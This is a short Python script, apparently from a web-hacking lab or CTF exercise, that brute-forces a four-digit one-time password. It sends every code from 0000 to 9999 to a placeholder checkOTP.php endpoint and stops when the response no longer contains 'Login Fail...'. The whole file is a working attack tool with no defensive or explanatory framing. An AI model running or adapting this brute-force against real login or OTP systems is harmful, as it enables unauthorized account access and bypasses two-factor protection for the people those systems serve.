import requests

def findOTP():
    url = "http://target_address/checkOTP.php"
    print("[*] Password Crack Start...")
    
    for i in range(10000): #(0,9999)
        tryNum = str(i).zfill(4) #f"{otp_num:04d}"
        params = {"otpNum": tryNum}
        print("[>] Try : [" + tryNum + "]", end="\r")
        response = requests.get(url, params=params)

        # alert('Login Fail...');
        if 'Login Fail...' not in response.text:
            print("[+] Found Code : " + tryNum)
            break

if __name__ == '__main__':
    findOTP()